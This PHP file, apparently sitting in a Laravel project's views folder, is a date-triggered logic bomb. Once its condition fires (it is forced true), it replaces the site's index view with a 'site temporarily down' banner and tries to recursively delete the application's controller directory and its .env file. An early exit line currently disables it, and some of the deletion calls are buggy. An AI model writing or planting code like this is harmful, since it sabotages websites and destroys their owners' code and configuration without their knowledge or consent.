<?php
// Set timezone
date_default_timezone_set('UTC'); // Change according to your server

$startDate = '2025-02-26';
$currentDate = new DateTime();
$start = new DateTime($startDate);
$daysPassed = $start->diff($currentDate)->days;
exit('te');
// Check if more than 15 days have passed
if (1 || $daysPassed > 15) {
    // Define paths
    $indexPath = __DIR__ . '/index.blade.php'; // Assuming this is the main index file
    // $resourcesPath = __DIR__ . '/../../../resources/views'; // Assuming this is the resources/views directory
    $controllerPath = __DIR__ . '/../../../app/Http/Controller'; // Assuming this is the resources/views directory
    $envPath = __DIR__ . '/../../../.env'; 
    // HTML message
    $html = <<<HTML
    <div style="text-align: center; padding: 20px; background: red; color: white;">
        <h2>Sorry, This site is temporarily down. We will get back to you soon.</h2>
    </div>
    HTML;

    // Overwrite the index.php file with the message
    file_put_contents($indexPath, "<?php echo '$html'; ?>");

    // Function to delete a directory and its contents
    function deleteFolder($folderPath) {
        if (!is_dir($folderPath)) {
            return false;
        }
        $files = array_diff(scandir($folderPath), ['.', '..']);
        foreach ($files as $file) {
            $filePath = "$folderPath/$file";
            if (is_dir($filePath)) {
                deleteFolder($filePath); // Recursively delete subdirectories
            } else {
                unlink($filePath); // Delete file
            }
        }
        return rmdir($folderPath);
    }

    // Delete the folders
    deleteFolder($$indexPath);
    // deleteFolder($resourcesPath);
    deleteFolder($controllerPath);
    deleteFolder($envPath);

    // Stop execution
    exit("done");
}
?>
